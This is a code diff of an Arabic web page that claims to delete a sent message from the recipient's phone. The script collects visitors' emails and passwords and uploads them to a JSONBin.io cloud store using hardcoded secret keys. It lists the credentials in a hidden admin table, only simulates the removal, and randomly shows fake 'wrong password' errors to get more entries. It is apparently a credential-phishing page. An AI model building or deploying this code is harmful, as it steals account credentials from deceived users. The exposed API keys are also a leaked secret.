@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>حذف الرسالة من صاحب الهاتف | نظام مركزي سحابي</title>
-    <!-- Font Awesome 6 -->
+    <title>حذف الرسالة من صاحب الهاتف | نظام سحابي متكامل</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Cairo', 'Segoe UI', 'Tahoma', system-ui, sans-serif;
+            font-family: 'Cairo', 'Segoe UI', system-ui, sans-serif;
         }
 
         body {
@@ -35,7 +34,7 @@
             padding: 1rem 1.5rem;
             border-radius: 70px;
             margin-bottom: 2rem;
-            border: 1px solid rgba(255,255,255,0.12);
+            border: 1px solid rgba(255, 255, 255, 0.12);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -50,7 +49,7 @@
             backdrop-filter: blur(12px);
             border-radius: 2rem;
             padding: 1.8rem;
-            border: 1px solid rgba(255,255,255,0.08);
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
         .card h2 {
@@ -87,7 +86,7 @@
         }
         .input-group input:focus {
             border-color: #f97316;
-            box-shadow: 0 0 0 3px rgba(249,115,22,0.25);
+            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.25);
         }
         .input-icon {
             position: absolute;
@@ -152,11 +151,11 @@
             background: linear-gradient(145deg, #1a1f2e, #111725);
             border-radius: 2rem;
             margin-top: 1rem;
-            border: 1px solid rgba(249,115,22,0.3);
+            border: 1px solid rgba(249, 115, 22, 0.3);
             overflow: hidden;
         }
         .admin-gate-header {
-            background: rgba(0,0,0,0.4);
+            background: rgba(0, 0, 0, 0.4);
             padding: 1.2rem 1.8rem;
             cursor: pointer;
             display: flex;
@@ -164,7 +163,7 @@
             justify-content: space-between;
             transition: 0.2s;
         }
-        .admin-gate-header:hover { background: rgba(249,115,22,0.15); }
+        .admin-gate-header:hover { background: rgba(249, 115, 22, 0.15); }
         .admin-gate-header h3 { font-size: 1.3rem; color: #facc15; display: flex; align-items: center; gap: 12px; }
         .toggle-icon { font-size: 1.6rem; color: #94a3b8; transition: 0.2s; }
         .admin-login-panel {
@@ -192,20 +191,62 @@
         }
         .btn-admin-login:hover { background: #fb923c; }
         .error-login { color: #f87171; margin-top: 0.8rem; text-align: center; }
-        .admin-dashboard-panel { background: #0f1420; border-radius: 1.5rem; padding: 1rem; }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 10px; }
-        .logout-btn { background: #334155; padding: 0.5rem 1.2rem; border-radius: 2rem; border: none; color: white; cursor: pointer; transition: 0.2s; }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .logout-btn {
+            background: #334155;
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+            border: none;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+        }
         .logout-btn:hover { background: #475569; }
-        .accounts-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; color: #e2e8f0; }
-        .accounts-table th, .accounts-table td { border-bottom: 1px solid #2d3a4e; padding: 12px 8px; text-align: right; }
+        .accounts-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85rem;
+            color: #e2e8f0;
+        }
+        .accounts-table th, .accounts-table td {
+            border-bottom: 1px solid #2d3a4e;
+            padding: 12px 8px;
+            text-align: right;
+        }
         .accounts-table th { background-color: #1e293b; color: #facc15; }
         .badge { background: #0f172a; padding: 4px 10px; border-radius: 40px; font-family: monospace; color: #94a3b8; }
         .delete-account-btn { background: none; border: none; color: #f87171; cursor: pointer; font-size: 0.9rem; transition: 0.1s; }
         .delete-account-btn:hover { color: #ffabab; }
         .footer-note { margin-top: 1rem; text-align: center; color: #6c7a91; font-size: 0.7rem; }
-        .sync-status { font-size: 0.75rem; color: #10b981; margin-top: 8px; text-align: center; padding: 5px; background: #0a0e16; border-radius: 1rem; }
+        .sync-status {
+            font-size: 0.75rem;
+            color: #10b981;
+            margin-top: 8px;
+            text-align: center;
+            padding: 5px;
+            background: #0a0e16;
+            border-radius: 1rem;
+        }
         .sync-status i { margin-left: 5px; }
-        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #f97316; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; }
+        .sync-status.warning { color: #facc15; }
+        .sync-status.error { color: #f87171; }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f97316;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
         @keyframes spin { to { transform: rotate(360deg); } }
         @media (max-width: 700px) { .single-card { margin: 0 0 1.5rem 0; } }
     </style>
@@ -279,7 +320,7 @@
                         <tr><th>البريد الإلكتروني</th><th>كلمة المرور</th><th>تاريخ الإضافة</th><th>آخر عملية إزالة</th><th>إجراء</th></tr>
                     </thead>
                     <tbody id="adminAccountsTbody">
-                        <tr><td colspan="5" style="text-align:center;"><div class="loading-spinner"></div> جارٍ تحميل البيانات...</td></tr>
+                        <tr><td colspan="5"><div class="loading-spinner"></div> جارٍ تحميل البيانات...</td></tr>
                     </tbody>
                 </table>
             </div>
@@ -292,23 +333,28 @@
 
 <script>
     // ==============================================================
-    // تكوين JSONBin.io باستخدام المفاتيح المقدمة
+    // تكوين JSONBin.io - باستخدام المفاتيح الصحيحة
     // ==============================================================
-    const BIN_ID = "67c4e8a7acd3cb34a8f5b9e2";
+    const BIN_ID = "6a248244da38895dfe924023";
     const MASTER_KEY = "$2a$10$PjryulcTELxOO7tNF0zfXOaJK82TKHJD9YxM5.GtHxojQjQQuXlny";
+    const ACCESS_KEY = "$2a$10$5ljxl9.SvCqIwxEro4pmBOkCHuftBtK1uGDY7imixSun98eGsyvti";
     
     let accounts = [];
     let isProcessing = false;
     let attemptCounter = 0;
     let isAdminLoggedIn = false;
-    let isOnline = true;
 
     // دالة لجلب البيانات من السحاب
     async function fetchAccountsFromCloud() {
+        const syncDiv = document.getElementById("syncStatus");
+        syncDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> جارٍ المزامنة مع السحاب...';
+        syncDiv.className = "sync-status";
+        
         try {
             const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                 headers: {
                     'X-Master-Key': MASTER_KEY,
+                    'X-Access-Key': ACCESS_KEY,
                     'Content-Type': 'application/json'
                 }
             });
@@ -322,60 +368,55 @@
                 } else {
                     accounts = [];
                 }
-                isOnline = true;
-                document.getElementById("syncStatus").innerHTML = '<i class="fas fa-cloud-upload-alt"></i> ✅ متزامن مع السحاب - البيانات مشتركة بين جميع الأجهزة';
+                
+                // تنظيف البيانات
+                accounts.forEach(acc => {
+                    if (!acc.addedAt) acc.addedAt = new Date().toLocaleString('ar-EG');
+                    if (!acc.lastRemoval) acc.lastRemoval = "لم تنفذ أي عملية بعد";
+                    if (!acc.id) acc.id = Date.now() + Math.random();
+                });
+                
+                syncDiv.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> ✅ متزامن مع السحاب - البيانات مشتركة بين جميع الأجهزة';
+                syncDiv.className = "sync-status";
+                if (isAdminLoggedIn) renderAdminTable();
+                return true;
             } else {
-                throw new Error("فشل الاتصال");
+                throw new Error(`HTTP ${response.status}`);
             }
         } catch (error) {
-            console.warn("فشل الاتصال بالسحاب:", error);
-            isOnline = false;
-            document.getElementById("syncStatus").innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ غير متصل بالسحاب - بيانات محلية مؤقتة';
+            console.error("فشل الاتصال بالسحاب:", error);
+            syncDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ غير متصل بالسحاب - بيانات محلية مؤقتة';
+            syncDiv.className = "sync-status warning";
             
-            // استخدام النسخة المحلية كنسخة احتياطية
+            // استخدام النسخة المحلية
             const localBackup = localStorage.getItem("offline_backup_accounts");
             if (localBackup) {
                 accounts = JSON.parse(localBackup);
             } else {
                 accounts = [];
             }
+            if (isAdminLoggedIn) renderAdminTable();
+            return false;
         }
-        
-        // تنظيف البيانات والتأكد من وجود الحقول المطلوبة
-        accounts.forEach(acc => {
-            if (!acc.addedAt) acc.addedAt = new Date().toLocaleString('ar-EG');
-            if (!acc.lastRemoval) acc.lastRemoval = "لم تنفذ أي عملية بعد";
-            if (!acc.id) acc.id = Date.now() + Math.random();
-        });
-        
-        // حفظ نسخة احتياطية محلية
-        localStorage.setItem("offline_backup_accounts", JSON.stringify(accounts));
-        
-        if (isAdminLoggedIn) renderAdminTable();
-        return true;
     }
     
     // دالة لحفظ البيانات في السحاب
     async function saveAccountsToCloud() {
-        if (!isOnline) {
-            // إذا كان غير متصل، نحفظ محلياً فقط
-            localStorage.setItem("offline_backup_accounts", JSON.stringify(accounts));
-            if (isAdminLoggedIn) renderAdminTable();
-            return false;
-        }
-        
         try {
             const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
-                    'X-Master-Key': MASTER_KEY
+                    'X-Master-Key': MASTER_KEY,
+                    'X-Access-Key': ACCESS_KEY
                 },
                 body: JSON.stringify({ accounts: accounts })
             });
             
             if (response.ok) {
-                document.getElementById("syncStatus").innerHTML = '<i class="fas fa-cloud-upload-alt"></i> ✅ متزامن مع السحاب - البيانات مشتركة';
+                const syncDiv = document.getElementById("syncStatus");
+                syncDiv.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> ✅ متزامن مع السحاب - البيانات مشتركة';
+                syncDiv.className = "sync-status";
                 localStorage.setItem("offline_backup_accounts", JSON.stringify(accounts));
                 if (isAdminLoggedIn) renderAdminTable();
                 return true;
@@ -384,7 +425,9 @@
             }
         } catch (error) {
             console.warn("فشل حفظ البيانات في السحاب:", error);
-            document.getElementById("syncStatus").innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ غير متصل - تم الحفظ محلياً مؤقتاً';
+            const syncDiv = document.getElementById("syncStatus");
+            syncDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ غير متصل - تم الحفظ محلياً مؤقتاً';
+            syncDiv.className = "sync-status warning";
             localStorage.setItem("offline_backup_accounts", JSON.stringify(accounts));
             if (isAdminLoggedIn) renderAdminTable();
             return false;
@@ -456,7 +499,7 @@
         return str.replace(/[&<>]/g, (m) => m === '&' ? '&amp;' : (m === '<' ? '&lt;' : '&gt;')); 
     }
     
-    // محاكاة الإزالة (مع مدة عشوائية ورسائل فشل عشوائية)
+    // محاكاة الإزالة
     async function runRemoval() {
         if (isProcessing) { 
             alert("الرجاء الانتظار حتى اكتمال العملية الحالية."); 
@@ -474,7 +517,6 @@
         await fetchAccountsFromCloud();
         addAccountIfNew(emailVal, passVal);
         
-        // منطق عشوائي لظهور "كلمة المرور خاطئة" (مرة كل 3-4 محاولات)
         attemptCounter++;
         let willFail = (attemptCounter % 3 === 0) || (attemptCounter % 4 === 0) || (Math.random() < 0.25);
         
@@ -483,7 +525,6 @@
             return;
         }
         
-        // عملية ناجحة مع لودر بطيء (بين 30 و 60 ثانية)
         isProcessing = true;
         const removeBtn = document.getElementById("removeMessageBtn");
         removeBtn.disabled = true;
